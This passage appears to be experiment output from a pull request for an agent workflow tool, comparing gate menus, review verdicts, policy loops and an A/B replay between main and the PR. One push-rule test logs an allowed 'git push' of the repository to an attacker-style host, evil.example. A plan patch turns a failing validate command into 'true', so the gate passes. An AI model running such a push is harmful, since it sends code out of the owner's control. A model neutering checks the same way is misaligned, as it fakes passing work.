PR    second time-out: Change the group's command (Recommended)|Run the gate again with twice the time|Fix ...|More options
main  after an empty fix: Loop back to Plan (Recommended)|Fix ...|Run ...|Save for later
PR    after an empty fix: Change the group's command (Recommended)|Loop back to Plan|Fix ...|More options
```

**B. Review with one open finding, shipped defaults** (`exp2.sh`, `exp3.sh`):

```
main  MEDIUM: verdict PASS  Continue to Check (Recommended)|Loop back to Build|Architecture Depth Review|More options
              more: Accept a finding|Grill Me|Make a small change|Save for later
PR    MEDIUM: verdict PASS  Loop back to Build (Recommended)|Continue to Check|Architecture Depth Review|More options
              more: More options|Make a small change
              accept question present: True | an option that leads to it: False | Save for later reachable: False
main  HIGH  : verdict PASS  Continue to Check (Recommended)|...
PR    HIGH  : verdict FAIL  Loop back to Build (Recommended)|Accept a finding|Override and continue|More options
PR    LOW   : verdict PASS  Continue to Check (Recommended)|Loop back to Build|Architecture Depth Review|More options
```

**C. Plan patch** (`exp3.sh`, `exp5.sh`):

```
after patch: {'fails': 1, 'fix_tries': 1, 'fix_empty': 1, 'gate': None}
the patched command now fails on a real test: ... FAIL: test_real_bug. A fix agent changed nothing, so the cause is
  not in the group's code ... Change the group's command?
group gate: FAIL: group G1 Validate failed (exit 1): bash -c "exit 1"
patch:      OK: G1 Validate is now `true` (was `bash -c "exit 1"`)
group gate: PASS: group G1
['plan patch by the person: G1 Validate: `bash -c "exit 1"` -> `true` [PERSON]']
```

**D. Design answer** (`exp2.sh`, `exp4.sh`):

```
main  after the answer: design verdict PASS  Continue to Build (Recommended)|Autonomous Build: run Build unattended|...
PR    after the answer: design verdict FAIL  (tasks agree with decisions: 1 Design answer(s) came after the plan ...)
      Loop back to Plan (Recommended)|Override and continue|Save for later
      override calls: override design --reason '{reason}', state advance design_complete build, spec commit ...
      an option that arms the run: False
```

**E. The policy at a failed group** (`exp6.sh`, `exp3.sh`):

```
step 1: auto  "the policy takes "Fix the group's merged work""   call: group fix G1
step 2: auto  "the policy takes "Loop back to Plan""             call: state loop build plan --reason 'policy: group G1 failed its check ...'
        OK: grouped run reset for the re-plan      -> stage=plan run_mode=autonomous
step 3: work  agents=1  "Plan: the Plan agent is working on opus."
not armed, after group fix G1: action=work agents=['temper:temper-build']
plan question: run.mode autonomous; Stage by stage (Recommended) => spec branch, spec commit, state advance plan_complete build
at Build's passed gate after 'Stage by stage': auto | Build passed; the policy run goes on to Review.
```

**F. The policy and a manual criterion** (`exp1.sh`):

```
failed rows: [('acceptance evidence', 'AC-09 has no supported passing evidence row')]
interactive: ask | Confirmed (Recommended)
armed + policy: auto | state loop check build --reason 'policy: acceptance evidence: AC-09 has no supported passing evidence row'
```

**G. Fix pass after a failed integrate** (`exp9.sh`):

```
round 1: action=work agent=temper:temper-build after=[usage add, integrate, gate build]
   the prompt names the integration failure: False | names the loop reason: True
   integrate: FAIL: integration suite failed (exit 1)      integration: FAIL | build verdict: None
round 2: the same action, the same prompt       round 3: the same
```

**H. ENV, reuse, void, staged RED** (`exp8.sh`, `exp4.sh`, `exp5.sh`):

```
gate 1..3: ENV: Task 1 failed on the environment, not on the code: Connection refused
           task: running attempt 1   next: ask | Check it again (Recommended)|Save for later
group gate 2nd: [temper: the same command passed on this same tree at ...; reused, not run again] PASS: group G1
after voiding the group's pass: reused again, PASS; group status passed
after voiding the task's GREEN: task status passed; runs.py build -> 1 0 0
staged RED, one comment added to the code before GREEN: PASS: Task 1
Check SETUP, rounds 1..3: first option "Repair the environment and run again (Recommended)" each time
```

**I. Commit gate's own row** (`exp7.sh`):

```
main: ... Override and commit?   labels: Override and commit|Make a small change|Save for later   reruns the gate: True
PR  : ... change what it names ..., then check again.   labels: Make a small change|Save for later   reruns the gate: False
```

**J. Backup push** (`push-test.ts`): `ALLOWED git push https://evil.example/x.git HEAD:temper-backup/x`; `ALLOWED git
push origin refs/stash:temper-backup/x`; `refused git push origin HEAD:main`; `refused git push origin
+HEAD:temper-backup/x`.

**K. A/B replay** (`bash scripts/e2e/ab-replay.sh` on `10e965a`, 53 s; scripted agents):

```
                              base 9.8.4   this 9.8.5   this + policy
questions to the person            8            8            4
repairs by hand                    2            0            0
agent launches                    10            7            7
agent minutes (estimate)         191           92           92
loops recommended                  1            1            0
build tool runs                   30           36           36
```
